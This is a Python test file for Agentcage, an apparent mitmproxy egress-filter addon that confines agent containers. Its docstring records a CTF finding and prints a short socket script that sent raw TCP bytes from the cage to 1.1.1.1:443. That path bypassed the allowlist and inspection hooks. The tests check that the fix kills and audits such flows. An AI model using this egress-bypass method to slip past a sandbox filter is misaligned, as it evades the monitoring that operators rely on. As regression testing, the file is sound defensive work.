"""Tests for the container-backend addon's non-HTTP TCP bypass guard.

Regression coverage for the CTF finding that mitmproxy in transparent
mode bridges raw TCP (and non-HTTP TLS) through unmodified — bypassing
the ``request``/``response``/``websocket_message`` hooks that enforce
the allowlist, inspector chain, and secret-injection policy. The fix
adds a ``tcp_start`` hook that kills any flow reaching the TCP layer.

CTF proof (pre-fix):

.. code-block:: python

    import socket, time
    s = socket.socket(); s.settimeout(5)
    s.connect(('1.1.1.1', 443))
    s.sendall(f'CANARY-{int(time.time())}\\r\\n'.encode())
    print(s.recv(200))
    # b'HTTP/1.1 400 Bad Request\\r\\nServer: cloudflare\\r\\n...'

The raw bytes hit Cloudflare — the addon's hooks never ran.

These tests use the same mitmproxy-stubbed import pattern as
``test_addon_relays.py``.
"""

from __future__ import annotations

import json
import sys
import types
from unittest.mock import MagicMock

import pytest


# ── Stub mitmproxy before importing addon ────────────────


_mitmproxy = types.ModuleType("mitmproxy")
_mitmproxy.__path__ = []
_mitmproxy.ctx = MagicMock()
_mitmproxy.http = MagicMock()
_proxy = types.ModuleType("mitmproxy.proxy")
_proxy.__path__ = []
_mode_specs = types.ModuleType("mitmproxy.proxy.mode_specs")
_mode_specs.ReverseMode = MagicMock()
_mitmproxy.proxy = _proxy
_proxy.mode_specs = _mode_specs
sys.modules.setdefault("mitmproxy", _mitmproxy)
sys.modules.setdefault("mitmproxy.ctx", _mitmproxy.ctx)
sys.modules.setdefault("mitmproxy.http", _mitmproxy.http)
sys.modules.setdefault("mitmproxy.proxy", _proxy)
sys.modules.setdefault("mitmproxy.proxy.mode_specs", _mode_specs)

from addon import Agentcage  # noqa: E402


def _make_addon(tmp_path):
    """Minimally configured Agentcage. Writes audit lines to tmp_path."""
    addon = Agentcage()
    addon.cfg = {}
    addon.log_allowed = False
    addon._audit_file = (tmp_path / "audit.jsonl").open("a")
    return addon


def _make_tcp_flow(*, sni=None, server_address=None, server_peername=None):
    """Build a mock TCP flow for the ``tcp_start`` hook.

    ``sni`` is the TLS SNI the cage committed to (None for plain TCP).
    ``server_address`` is what mitmproxy resolves from SO_ORIGINAL_DST
    in transparent mode (the cage's TCP destination IP:port).
    ``server_peername`` is the post-connect peer address (often unset
    under ``connection_strategy=lazy``).
    """
    flow = MagicMock()
    flow.client_conn.sni = sni
    flow.server_conn.address = server_address
    flow.server_conn.peername = server_peername
    flow.server_conn.error = None
    flow.killable = True
    flow.live = True
    return flow


class TestTcpBypassGuard:
    """The ``tcp_start`` hook kills any TCP flow that reaches it.

    HTTP and HTTPS flows go through ``HttpLayer`` (not ``TCPLayer``) and
    never produce a ``TCPFlow``, so this hook only fires for the raw-TCP
    / non-HTTP-TLS bypass path the CTF demonstrated.
    """

    def test_raw_tcp_to_ip_is_blocked(self, tmp_path):
        """The exact CTF case: cage opens a raw TCP socket to
        ``1.1.1.1:443`` and writes non-HTTP bytes. The flow hits
        ``tcp_start`` (mitmproxy's ``next_layer`` falls back to
        ``TCPLayer`` because the bytes don't look like HTTP) and the
        addon must kill it before any byte leaves the cage."""
        addon = _make_addon(tmp_path)
        flow = _make_tcp_flow(
            sni=None,
            server_address=("1.1.1.1", 443),
        )

        addon.tcp_start(flow)

        # Belt 1: server_conn.error set → mitmproxy's open_connection
        # aborts before the upstream socket is opened. This is what
        # actually prevents the bytes from leaving the cage.
        assert flow.server_conn.error
        assert "non-http TCP bypass" in flow.server_conn.error

        # Belt 2: flow.kill() called → canonical killed state for
        # downstream addons and the audit pipeline.
        flow.kill.assert_called_once_with()

        # Audit line landed in audit.jsonl with the right shape.
        addon._audit_file.flush()
        lines = (tmp_path / "audit.jsonl").read_text().splitlines()
        assert len(lines) == 1
        entry = json.loads(lines[0])
        assert entry["kind"] == "tcp_bypass_blocked"
        assert entry["decision"] == "blocked"
        assert entry["direction"] == "outbound"
        assert "1.1.1.1:443" in entry["host"]
        assert "non-http TCP bypass" in entry["reason"]

    def test_non_http_tls_with_sni_is_blocked(self, tmp_path):
        """TLS variant: cage opens a TLS connection with a real SNI but
        carries non-HTTP bytes (e.g. SMTPS, IMAPS, a custom binary
        protocol). After the TLS handshake mitmproxy's ``next_layer``
        sees non-HTTP inner bytes and falls back to ``TCPLayer``. The
        addon must still kill it — the L7 hooks would never fire.

        The audit entry records the SNI as the host (more useful than
        the SO_ORIGINAL_DST IP) so operators can see which destination
        the cage was trying to reach."""
        addon = _make_addon(tmp_path)
        flow = _make_tcp_flow(
            sni="smtp.example.com",
            server_address=("203.0.113.5", 465),  # SMTPS
        )

        addon.tcp_start(flow)

        assert flow.server_conn.error
        flow.kill.assert_called_once_with()

        addon._audit_file.flush()
        entry = json.loads(
            (tmp_path / "audit.jsonl").read_text().splitlines()[0]
        )
        # SNI wins over original-dst IP for the audit host field.
        assert entry["host"] == "smtp.example.com"

    def test_unknown_destination_does_not_crash(self, tmp_path):
        """Defensive: a flow with neither SNI nor a server address (e.g.
        an early error) must still be killed and audited — the addon
        must never raise out of a mitmproxy hook (would tear down the
        proxy and fail the cage open)."""
        addon = _make_addon(tmp_path)
        flow = _make_tcp_flow(
            sni=None,
            server_address=None,
            server_peername=None,
        )

        addon.tcp_start(flow)  # must not raise

        assert flow.server_conn.error
        flow.kill.assert_called_once_with()
        addon._audit_file.flush()
        entry = json.loads(
            (tmp_path / "audit.jsonl").read_text().splitlines()[0]
        )
        assert entry["host"] == "<unknown>"

    def test_already_killed_flow_is_not_double_killed(self, tmp_path):
        """If something already killed the flow (e.g. a higher-priority
        addon), don't call ``flow.kill()`` again — mitmproxy raises
        ``ControlException`` on ``kill()`` of a non-killable flow."""
        addon = _make_addon(tmp_path)
        flow = _make_tcp_flow(server_address=("1.2.3.4", 443))
        flow.killable = False  # already killed

        addon.tcp_start(flow)  # must not raise

        flow.kill.assert_not_called()
        # We still set server_conn.error and audit.
        assert flow.server_conn.error
        addon._audit_file.flush()
        assert (tmp_path / "audit.jsonl").read_text().strip()

    def test_audit_writes_to_stderr_too(self, tmp_path, capsys):
        """Match the regular ``_log()`` sink: audit lines go to both
        stderr (visible in ``cage logs``/journalctl) AND the audit file.
        Without the stderr fork, operators inspecting live container
        logs would see HTTP blocks but not TCP-bypass blocks."""
        addon = _make_addon(tmp_path)
        flow = _make_tcp_flow(server_address=("8.8.8.8", 443))

        addon.tcp_start(flow)

        captured = capsys.readouterr()
        # stderr line is the same JSON as the file line.
        stderr_lines = [l for l in captured.err.splitlines() if l.strip()]
        assert stderr_lines, captured.err
        parsed = json.loads(stderr_lines[-1])
        assert parsed["kind"] == "tcp_bypass_blocked"

    def test_bytes_sni_is_decoded(self, tmp_path):
        """mitmproxy types ``sni`` as ``str | None``, but historically
        some paths handed back ``bytes``. The addon must accept either
        (the apple-container backend's ``_authoritative_host`` already
        normalizes this; container backend's helper must do the same)."""
        addon = _make_addon(tmp_path)
        flow = _make_tcp_flow(
            sni=b"smtp.example.com",
            server_address=("203.0.113.5", 465),
        )

        addon.tcp_start(flow)

        addon._audit_file.flush()
        entry = json.loads(
            (tmp_path / "audit.jsonl").read_text().splitlines()[0]
        )
        assert entry["host"] == "smtp.example.com"

    def test_feeds_the_watcher_ring(self, tmp_path):
        """PR #340 review fix: ``tcp_start`` wrote directly to stderr
        and ``_audit_file``, bypassing ``_audit_write`` — the single
        funnel point every other audit producer uses to feed the
        traffic watcher's ring (``addon._ring_ingest``). An egress
        bypass is exactly the kind of event the watcher exists to
        catch, so it must land in the ring like any other decision."""
        from collections import deque
        addon = _make_addon(tmp_path)
        addon._watcher_ring = deque()
        flow = _make_tcp_flow(server_address=("1.1.1.1", 443))

        addon.tcp_start(flow)

        assert len(addon._watcher_ring) == 1
        assert addon._watcher_ring[0]["kind"] == "tcp_bypass_blocked"
        assert addon._watcher_ring[0]["decision"] == "blocked"
